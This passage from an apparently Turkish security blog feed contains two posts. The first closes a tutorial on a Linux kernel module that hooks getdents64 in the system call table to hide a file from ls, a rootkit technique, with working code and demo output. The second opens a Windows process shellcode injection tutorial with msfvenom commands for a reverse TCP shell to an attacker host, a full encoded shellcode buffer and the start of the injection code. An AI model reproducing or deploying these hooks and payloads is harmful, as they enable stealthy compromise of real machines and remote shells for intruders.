&lt;p&gt;&lt;strong&gt;System Call Table&lt;/strong&gt;‘nin adresini linux içerisinde bulmamız gerek ki gerçek &lt;strong&gt;System Call&lt;/strong&gt; ile bizim yazdığımız sahte &lt;strong&gt;Hook&lt;/strong&gt; sistem çağrısını değiştirebilelim.&lt;/p&gt;

&lt;p&gt;Ve bu şekilde her &lt;strong&gt;ls&lt;/strong&gt; komutu çalıştığında gerçek &lt;strong&gt;getdents64&lt;/strong&gt; sistem çağrısı yerine bizim &lt;strong&gt;hook_getdents64&lt;/strong&gt; sistem çağrımız çalışıcak.&lt;/p&gt;

&lt;p&gt;Yazdığımız hook belirttiğimiz dosyayı gizlemeye yaradığından &lt;strong&gt;ls&lt;/strong&gt; komutu çalıştığında hiçbir şekilde görülemeyecek.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;sys_call_table&lt;/strong&gt;‘nin adresini bulmak için &lt;strong&gt;/boot&lt;/strong&gt; içerisinde bulunan &lt;strong&gt;System.map&lt;/strong&gt;‘e bakmamız gerekiyor :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;deadbeef@pop-os:~$ sudo grep sys_call_table /boot/System.map-`uname -r`
ffffffff820001c0 R sys_call_table
ffffffff820015a0 R ia32_sys_call_table
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ve bu şekilde &lt;strong&gt;sys_call_table&lt;/strong&gt;‘mizin adresini bulduk &lt;strong&gt;ffffffff820001c0&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Şimdide bu &lt;strong&gt;sys_call_table&lt;/strong&gt;‘ı yazılabilir yapmamız gerek ki asıl sistem çağrısı ile bizim sahte yani &lt;strong&gt;Hook&lt;/strong&gt; sistem çağrısını değiştirebilelim.&lt;/p&gt;

&lt;p&gt;Bunuda yapmak için vereceğimiz &lt;strong&gt;sys_call_table&lt;/strong&gt; adresinin &lt;strong&gt;table entry&lt;/strong&gt;‘sini &lt;strong&gt;manual&lt;/strong&gt; olarak writable yapmamız gerek.&lt;/p&gt;

&lt;p&gt;Bu stackoverflow sorusunun cevaplarında bunu yapmak için bir sürü teknik var bakmak isterseniz : &lt;a href=&quot;https://stackoverflow.com/questions/2103315/linux-kernel-system-call-hooking-example&quot;&gt;StackOverflow sys_call_table&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Bunuda &lt;strong&gt;lookup_address&lt;/strong&gt; fonksiyonu ile &lt;strong&gt;page table&lt;/strong&gt;‘nin adresini bulup sonrasında içerisinde &lt;strong&gt;sys_call_table&lt;/strong&gt;‘ye yazma yetkisi vermeliyiz :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int set_page_rw(unsigned long addr)
{
  unsigned int level;
  pte_t *pte = lookup_address(addr, &amp;amp;level);
  if (pte-&amp;gt;pte &amp;amp;~ _PAGE_RW) pte-&amp;gt;pte |= _PAGE_RW;
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Günün sonunda bu yazdığımız &lt;strong&gt;LKM&lt;/strong&gt;‘yi &lt;strong&gt;kernel&lt;/strong&gt;‘e yükleyeceğiz fakat sonrasında bunu sildiğimizde herşeyin tekrar aynı haline dönmesi olayıda var birde.&lt;/p&gt;

&lt;p&gt;Bunun içinde eğer &lt;strong&gt;sys_call_table&lt;/strong&gt;‘yi tekrardan &lt;strong&gt;Read-Only&lt;/strong&gt; yapmak istiyorsak yine aynı tekniği kullanabiliriz :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int set_page_ro(unsigned long addr)
{
  unsigned int level;
  pte_t *pte = lookup_address(addr, &amp;amp;level);
  pte-&amp;gt;pte = pte-&amp;gt;pte &amp;amp;~_PAGE_RW;
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Yetkilendirmeleri merak edenler varsa &lt;strong&gt;arch/x86/include/asm/pgtable_types.h&lt;/strong&gt; içerisinden küçük bir liste :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#define _PAGE_BIT_PRESENT       0       /* is present */
#define _PAGE_BIT_RW            1       /* writeable */
#define _PAGE_BIT_USER          2       /* userspace addressable */
#define _PAGE_BIT_PWT           3       /* page write through */
#define _PAGE_BIT_PCD           4       /* page cache disabled */
#define _PAGE_BIT_ACCESSED      5       /* was accessed (raised by CPU) */
#define _PAGE_BIT_DIRTY         6       /* was written to (raised by CPU) */
#define _PAGE_BIT_PSE           7       /* 4 MB (or 2MB) page */
#define _PAGE_BIT_PAT           7       /* on 4KB pages */
#define _PAGE_BIT_GLOBAL        8       /* Global TLB entry PPro+ */
#define _PAGE_BIT_UNUSED1       9       /* available for programmer */
#define _PAGE_BIT_IOMAP         10      /* flag used to indicate IO mapping */
#define _PAGE_BIT_HIDDEN        11      /* hidden by kmemcheck */
#define _PAGE_BIT_PAT_LARGE     12      /* On 2MB or 1GB pages */
#define _PAGE_BIT_SPECIAL       _PAGE_BIT_UNUSED1
#define _PAGE_BIT_CPA_TEST      _PAGE_BIT_UNUSED1
#define _PAGE_BIT_SPLITTING     _PAGE_BIT_UNUSED1 /* only valid on a PSE pmd */
#define _PAGE_BIT_NX           63       /* No execute: only valid after cpuid check */
#define _PAGE_PRESENT   (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_PRESENT)
#define _PAGE_RW        (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_RW)
#define _PAGE_USER      (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_USER)
#define _PAGE_PWT       (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_PWT)
#define _PAGE_PCD       (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_PCD)
#define _PAGE_ACCESSED  (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_ACCESSED)
#define _PAGE_DIRTY     (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_DIRTY)
#define _PAGE_PSE       (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_PSE)
#define _PAGE_GLOBAL    (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_GLOBAL)
#define _PAGE_UNUSED1   (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_UNUSED1)
#define _PAGE_IOMAP     (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_IOMAP)
#define _PAGE_PAT       (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_PAT)
....
#define _PAGE_PAT_LARGE (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_PAT_LARGE)
#define _PAGE_SPECIAL   (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_SPECIAL)
#define _PAGE_CPA_TEST  (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_CPA_TEST)
#define _PAGE_SPLITTING (_AT(pteval_t, 1) &amp;lt;&amp;lt; _PAGE_BIT_SPLITTING)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Modül yüklendiğinde yani &lt;strong&gt;insmod&lt;/strong&gt; çalıştığında :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static int __init getdents_hook_init(void)
{

  sys_call_table = (void*)0xffffffff820001c0;
  org_getdents64 = sys_call_table[__NR_getdents64];

  set_page_rw(sys_call_table);
  sys_call_table[__NR_getdents64] = hook_getdents64;
        return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;LKM&lt;/strong&gt;‘mizi oluşturup &lt;strong&gt;kernel&lt;/strong&gt;‘e dahil ettikten sonra çalışacak fonksiyon.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ÖNEMLİ&lt;/strong&gt; : Buradaki &lt;strong&gt;sys_call_table = (void*)0xsizinsyscalltableadresiniz;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Kısmını kendi &lt;strong&gt;sys_call_table&lt;/strong&gt; adresiniz ile değiştirmeniz gerekli.&lt;/p&gt;

&lt;p&gt;Nasıl bulacağınızı yukarıda anlatmıştım eğer blog içerisinde bulamadıysanız hemen &lt;strong&gt;CTRL + F&lt;/strong&gt; yapıp &lt;strong&gt;System.map&lt;/strong&gt; bunu arayın orada &lt;strong&gt;sys_call_table&lt;/strong&gt; adresinin nasıl bulunacağını anlattım.&lt;/p&gt;

&lt;p&gt;Şimdi geldik eğer bunu silmek istersek kısmına :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static void __exit getdents_hook_exit(void)
{
  sys_call_table[__NR_getdents64] = org_getdents64;
  set_page_ro(sys_call_table);
        return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Eğer oluşturduğumuz &lt;strong&gt;LKM&lt;/strong&gt;‘yi silersek oluşturduğumuz sahte &lt;strong&gt;Hook&lt;/strong&gt; fonksiyonunu &lt;strong&gt;sys_call_table&lt;/strong&gt;‘den çıkartıp herşeyi tekrar eski haline çevirmesini söylüyoruz programımıza aynı zamanda &lt;strong&gt;table entry&lt;/strong&gt;‘ide tekrardan &lt;strong&gt;Read-Only&lt;/strong&gt; yapıyoruz.&lt;/p&gt;

&lt;p&gt;Şimdi tüm bu yazdığımız kodları tek bir bütün haline almaya geldi sıra hepsini pastebine yüklüyorum. İçerisinden değiştirmeniz gereken tek kısım &lt;strong&gt;sys_call_table&lt;/strong&gt; adresi.&lt;/p&gt;

&lt;p&gt;Kod : &lt;a href=&quot;https://pastebin.com/a4MF1J7T&quot;&gt;System Call Hooking Code&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;make&quot;&gt;Make&lt;/h1&gt;
&lt;p&gt;Şimdi sıra geldi bu kodu derlemeye.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Makefile&lt;/strong&gt; isminde bir dosya oluşturun ve yukarıda yazdığımız kodu nasıl kaydettiyseniz burada bulunan &lt;strong&gt;syscallhook.o&lt;/strong&gt; ismini onunla değiştiriniz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;obj-m += syscallhook.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;make&lt;/strong&gt; komutunu çalıştırıp derledikten sonra çıktımız :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@heyhey:~/hey# make
make -C /lib/modules/4.4.0-78-generic/build M=/root/hey modules
make[1]: Entering directory `/usr/src/linux-headers-4.4.0-78-generic'
  CC [M]  /root/hey/syscallhook.o
/root/hey/syscallhook.c: In function ‘hook_getdents64’:
/root/hey/syscallhook.c:36:21: warning: assignment from incompatible pointer type [enabled by default]
                 cur = (struct linux_dirent*) ((char*)dirp + i);
                     ^
/root/hey/syscallhook.c: In function ‘getdents_hook_init’:
/root/hey/syscallhook.c:63:3: warning: passing argument 1 of ‘set_page_rw’ makes integer from pointer without a cast [enabled by default]
   set_page_rw(sys_call_table);
   ^
/root/hey/syscallhook.c:41:5: note: expected ‘long unsigned int’ but argument is of type ‘void **’
 int set_page_rw(unsigned long addr)
     ^
/root/hey/syscallhook.c: In function ‘getdents_hook_exit’:
/root/hey/syscallhook.c:71:3: warning: passing argument 1 of ‘set_page_ro’ makes integer from pointer without a cast [enabled by default]
   set_page_ro(sys_call_table);
   ^
/root/hey/syscallhook.c:49:5: note: expected ‘long unsigned int’ but argument is of type ‘void **’
 int set_page_ro(unsigned long addr)
     ^
/root/hey/syscallhook.c:72:9: warning: ‘return’ with a value, in function returning void [enabled by default]
         return 0;
         ^
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /root/hey/syscallhook.mod.o
  LD [M]  /root/hey/syscallhook.ko
make[1]: Leaving directory `/usr/src/linux-headers-4.4.0-78-generic'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;LKM&lt;/strong&gt;‘mizi derledikten sonra şimdi sıra geldi &lt;strong&gt;ls&lt;/strong&gt; komutundan kaçıracağımız baştada belirttiğimiz dosya ismini oluşturmaya :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@heyhey:~/hey# touch cokgizlidosya.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Bundan sonrası ziyafet. Şimdi oluşturduğumuz modülü kernel içerisine &lt;strong&gt;insmod&lt;/strong&gt; komutu ile aktaralım :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@heyhey:~/hey# insmod ./syscallhook.ko
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Modülü yüklemeden önce &lt;strong&gt;ls&lt;/strong&gt; komutunun bulduğu dosyalar :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; root@heyhey:~/hey# ls
cokgizlidosya.txt  Module.symvers  syscallhook.mod.c
Makefile           syscallhook.c   syscallhook.mod.o
modules.order      syscallhook.ko  syscallhook.o
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Modülü yükledikten sonra &lt;strong&gt;ls&lt;/strong&gt; komutunun bulduğu dosyalar :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; root@heyhey:~/hey# ls
Makefile       Module.symvers  syscallhook.ko     syscallhook.mod.o
modules.order  syscallhook.c   syscallhook.mod.c  syscallhook.o
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Gördüğünüz gibi &lt;strong&gt;ls&lt;/strong&gt; komutundan &lt;strong&gt;cokgizlidosya.txt&lt;/strong&gt; dosyamızı gizlemeyi &lt;strong&gt;System Call Table&lt;/strong&gt; içerisindeki &lt;strong&gt;ls&lt;/strong&gt; komutunun kullandığı sistem çağrılarını hook ederek başardık.&lt;/p&gt;

&lt;p&gt;Bu modülü silip herşeyi eski haline çevirmek için :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; root@heyhey:~/hey# rmmod syscallhook
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ve bu yazının da sonunda geldik. Umarım açıklayıcı anlatabilmişimdir.&lt;/p&gt;

&lt;p&gt;Sorular için twitter hesabım : &lt;a href=&quot;https://twitter.com/0DAYanc&quot;&gt;@0DAYanc&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Linux System Call Hooking</summary></entry><entry><title type="html">Process Shellcode Injection</title><link href="http://192.168.254.251:4000/2019/04/28/Process-Shellcode-Injection.html" rel="alternate" type="text/html" title="Process Shellcode Injection" /><published>2019-04-28T00:00:00+03:00</published><updated>2019-04-28T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2019/04/28/Process-Shellcode-Injection</id><content type="html" xml:base="http://192.168.254.251:4000/2019/04/28/Process-Shellcode-Injection.html">&lt;h3 id=&quot;process-shellcode-injection&quot;&gt;Process Shellcode Injection&lt;/h3&gt;

&lt;p&gt;Merhaba arkadaşlar yeni yazıma hoşgeldiniz.&lt;/p&gt;

&lt;p&gt;Çinliler ile olan birkaç serüvenim yüzünden bu yazıyı biraz geç yazmak zorunda kaldım.&lt;/p&gt;

&lt;p&gt;Serüvenlerden &lt;a href=&quot;https://twitter.com/0DAYanc/status/1121174960209301504&quot;&gt;bir tanesini twitterde&lt;/a&gt; paylaştım bakmak isterseniz.&lt;/p&gt;

&lt;p&gt;Hiç uzatmadan yazımıza geçelim. Bu yazımızda &lt;strong&gt;windows&lt;/strong&gt; içerisinde bulunan &lt;strong&gt;process&lt;/strong&gt;‘ler içerisine nasıl &lt;strong&gt;shellcode&lt;/strong&gt; &lt;strong&gt;inject&lt;/strong&gt; edebileceğimizi göreceğiz.&lt;/p&gt;

&lt;p&gt;Öncelikle yazımıza geçmeden önce &lt;strong&gt;C&lt;/strong&gt;, &lt;strong&gt;Windows Memory Management&lt;/strong&gt;, &lt;strong&gt;Heap - Stack&lt;/strong&gt; gibi kavramlara alışık olduğunuzu varsayıp bu yazıyı devam ettiriyorum.&lt;/p&gt;

&lt;h2 id=&quot;bilmemiz-gereken-kavramlar&quot;&gt;Bilmemiz gereken kavramlar&lt;/h2&gt;

&lt;h1 id=&quot;shellcode-nedir-&quot;&gt;Shellcode Nedir ?&lt;/h1&gt;

&lt;p&gt;&lt;em&gt;Shellcode kabuk kod demektir. Bunlara kısaca &lt;strong&gt;Hexcode&lt;/strong&gt; veya &lt;strong&gt;Hex&lt;/strong&gt; de diyebiliriz.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Örneğin büyük &lt;strong&gt;A&lt;/strong&gt; harfinin &lt;strong&gt;shellcode&lt;/strong&gt; yani &lt;strong&gt;hexcode&lt;/strong&gt; yani &lt;strong&gt;hex&lt;/strong&gt; karşılığı &lt;strong&gt;0x41&lt;/strong&gt;‘dir.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Basit bir şekilde &lt;strong&gt;makine kodu&lt;/strong&gt; dur.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;İşletim sistemi&lt;/strong&gt; ve &lt;strong&gt;User-mode application&lt;/strong&gt;‘ların birbirleri ile anlaştığı dil de diyebiliriz.&lt;/em&gt;&lt;/p&gt;

&lt;h1 id=&quot;process-nedir-&quot;&gt;Process Nedir ?&lt;/h1&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;İşletim sistemi&lt;/strong&gt;‘nin arka planında çalışan &lt;strong&gt;Uygulamalar&lt;/strong&gt; yani &lt;strong&gt;User-mode applications&lt;/strong&gt; diyebiliriz.&lt;/em&gt;&lt;/p&gt;

&lt;h1 id=&quot;process-shellcode-injection-nedir-&quot;&gt;Process Shellcode Injection Nedir ?&lt;/h1&gt;

&lt;p&gt;&lt;em&gt;Yukarıda ki iki terimi birleştirip yanına &lt;strong&gt;Injection&lt;/strong&gt; eklediğimizde oluşan kavram.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Ya da daha kompleks şekilde mevcut bir &lt;strong&gt;process&lt;/strong&gt; içerisinde çalışan &lt;strong&gt;hexcode&lt;/strong&gt;‘ların önüne eklediğimiz yeni &lt;strong&gt;hexcode&lt;/strong&gt;‘lar da &lt;strong&gt;Process Shellcode Injection&lt;/strong&gt; kavramına uygundur.&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;herşeyden-önce&quot;&gt;Herşeyden önce&lt;/h2&gt;
&lt;p&gt;Birazdan yazmaya ve anlatmaya başlayacağımız &lt;strong&gt;Process Shellcode Injection&lt;/strong&gt;‘u gerçekleştirmek için gerekli olan kaynak kodu &lt;strong&gt;derleme&lt;/strong&gt; sıkıntısı yaşayanlar olursa &lt;strong&gt;Visual Studio 2019 Community&lt;/strong&gt; IDE’sini indirip içerisinde derleyebilir.&lt;/p&gt;

&lt;h2 id=&quot;kaynak-kodumuza-geçelim&quot;&gt;Kaynak kodumuza geçelim&lt;/h2&gt;

&lt;p&gt;Kütüphanelerimizi dahil edelim :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;windows.h&amp;gt;
#include &amp;lt;psapi.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Main fonksiyonumuzu oluşturalım :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int main(int argc, char** argv) {

}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Şimdi geldik biraz zahmetli kısıma :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unsigned char shellcode[] = &quot;shellcodeburaya&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Bu kısım bizim &lt;strong&gt;process&lt;/strong&gt; içerisinde çalıştıracağımız &lt;strong&gt;hexcode&lt;/strong&gt; yani &lt;strong&gt;shellcode&lt;/strong&gt;‘umuzu içeriyor.&lt;/p&gt;

&lt;p&gt;Bunu oluşturmak için uğraşmadan &lt;strong&gt;metasploit&lt;/strong&gt; içerisinde bulunan &lt;strong&gt;msfvenom&lt;/strong&gt; toolundan yararlanabiliriz.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;x64&lt;/strong&gt; için :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.104 LPORT=4444 -f c -b \x00\x0a\x0d
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;x32&lt;/strong&gt; için:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.104 LPORT=4444 -f c -b \x00\x0a\x0d
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Burada bulunan &lt;strong&gt;LHOST&lt;/strong&gt; ve&lt;strong&gt;LPORT&lt;/strong&gt; kısmını kendinize göre düzenlediğinizi varsayıyorum&lt;/p&gt;

&lt;p&gt;Komutu çalıştırdıktan sonra bize &lt;strong&gt;C&lt;/strong&gt; ile uyumlu bir &lt;strong&gt;shellcode&lt;/strong&gt; gelecek aşşağıda yüklediğim fotoraftaki gibi :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.hizliresim.com/16QMMA.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bu gelen &lt;strong&gt;shellcode&lt;/strong&gt;‘u yukarıdaki &lt;strong&gt;buffer&lt;/strong&gt;‘imize ekleyelim :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unsigned char shellcode[] = 
		 &quot;\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff&quot;
		 &quot;\xff\xff\x48\xbb\x9e\xfc\xbf\xb8\x05\xa1\x62\x7f\x48\x31\x58&quot;
		 &quot;\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x62\xb4\x3c\x5c\xf5\x49&quot;
		 &quot;\xa2\x7f\x9e\xfc\xfe\xe9\x44\xf1\x30\x2e\xc8\xb4\x8e\x6a\x60&quot;
		 &quot;\xe9\xe9\x2d\xfe\xb4\x34\xea\x1d\xe9\xe9\x2d\xbe\xb4\x34\xca&quot;
		 &quot;\x55\xe9\x6d\xc8\xd4\xb6\xf2\x89\xcc\xe9\x53\xbf\x32\xc0\xde&quot;
		 &quot;\xc4\x07\x8d\x42\x3e\x5f\x35\xb2\xf9\x04\x60\x80\x92\xcc\xbd&quot;
		 &quot;\xee\xf0\x8e\xf3\x42\xf4\xdc\xc0\xf7\xb9\xd5\x2a\xe2\xf7\x9e&quot;
		 &quot;\xfc\xbf\xf0\x80\x61\x16\x18\xd6\xfd\x6f\xe8\x8e\xe9\x7a\x3b&quot;
		 &quot;\x15\xbc\x9f\xf1\x04\x71\x81\x29\xd6\x03\x76\xf9\x8e\x95\xea&quot;
		 &quot;\x37\x9f\x2a\xf2\x89\xcc\xe9\x53\xbf\x32\xbd\x7e\x71\x08\xe0&quot;
		 &quot;\x63\xbe\xa6\x1c\xca\x49\x49\xa2\x2e\x5b\x96\xb9\x86\x69\x70&quot;
		 &quot;\x79\x3a\x3b\x15\xbc\x9b\xf1\x04\x71\x04\x3e\x15\xf0\xf7\xfc&quot;
		 &quot;\x8e\xe1\x7e\x36\x9f\x2c\xfe\x33\x01\x29\x2a\x7e\x4e\xbd\xe7&quot;
		 &quot;\xf9\x5d\xff\x3b\x25\xdf\xa4\xfe\xe1\x44\xfb\x2a\xfc\x72\xdc&quot;
		 &quot;\xfe\xea\xfa\x41\x3a\x3e\xc7\xa6\xf7\x33\x17\x48\x35\x80\x61&quot;
		 &quot;\x03\xe2\xf1\xbb\xd6\x11\x4d\xc1\xcf\x8d\xb8\x05\xe0\x34\x36&quot;
		 &quot;\x17\x1a\xf7\x39\xe9\x01\x63\x7f\x9e\xb5\x36\x5d\x4c\x1d\x60&quot;
		 &quot;\x7f\x8f\xa0\x7f\x10\x05\xc9\x23\x2b\xd7\x75\x5b\xf4\x8c\x50&quot;
		 &quot;\x23\xc5\xd2\x8b\x99\xbf\xfa\x74\x2e\xf6\x74\x94\xbe\xb9\x05&quot;
		 &quot;\xa1\x3b\x3e\x24\xd5\x3f\xd3\x05\x5e\xb7\x2f\xce\xb1\x8e\x71&quot;
		 &quot;\x48\x90\xa2\x37\x61\x3c\xf7\x31\xc7\xe9\x9d\xbf\xd6\x75\x7e&quot;
		 &quot;\xf9\xbf\x4b\x6d\xa0\x7e\x03\x6a\xf0\x8c\x66\x08\x6f\xdf\xa4&quot;
		 &quot;\xf3\x31\xe7\xe9\xeb\x86\xdf\x46\x26\x1d\x71\xc0\x9d\xaa\xd6&quot;
		 &quot;\x7d\x7b\xf8\x07\xa1\x62\x36\x26\x9f\xd2\xdc\x05\xa1\x62\x7f&quot;
		 &quot;\x9e\xbd\xef\xf9\x55\xe9\xeb\x9d\xc9\xab\xe8\xf5\x34\x61\x08&quot;
		 &quot;\x72\xc7\xbd\xef\x5a\xf9\xc7\xa5\x3b\xba\xa8\xbe\xb9\x4d\x2c&quot;
		 &quot;\x26\x5b\x86\x3a\xbf\xd0\x4d\x28\x84\x29\xce\xbd\xef\xf9\x55&quot;
		 &quot;\xe0\x32\x36\x61\x3c\xfe\xe8\x4c\x5e\xaa\x32\x17\x3d\xf3\x31&quot;
		 &quot;\xc4\xe0\xd8\x06\x52\xc3\x39\x47\xd0\xe9\x53\xad\xd6\x03\x75&quot;
		 &quot;\x33\x0b\xe0\xd8\x77\x19\xe1\xdf\x47\xd0\x1a\x92\xca\x3c\xaa&quot;
		 &quot;\xfe\x02\xa3\x34\xdf\xe2\x61\x29\xf7\x3b\xc1\x89\x5e\x79\xe2&quot;
		 &quot;\xf6\x3f\x43\xe5\xd4\x67\xc4\xd9\xef\xcd\xd7\x6f\xa1\x3b\x3e&quot;
		 &quot;\x17\x26\x40\x6d\x05\xa1\x62\x7f&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Şimdi sıra geldi bu &lt;strong&gt;Shellcode&lt;/strong&gt;‘u belirteceğimiz &lt;strong&gt;process&lt;/strong&gt;‘in içine eklemeye.&lt;/p&gt;

&lt;p&gt;Herşeyden önce bizim &lt;strong&gt;process&lt;/strong&gt; içerisine bu &lt;strong&gt;shellcode&lt;/strong&gt;‘u eklememiz için o &lt;strong&gt;process&lt;/strong&gt;‘i açmamız gerekiyor.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HANDLE processwithpid = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
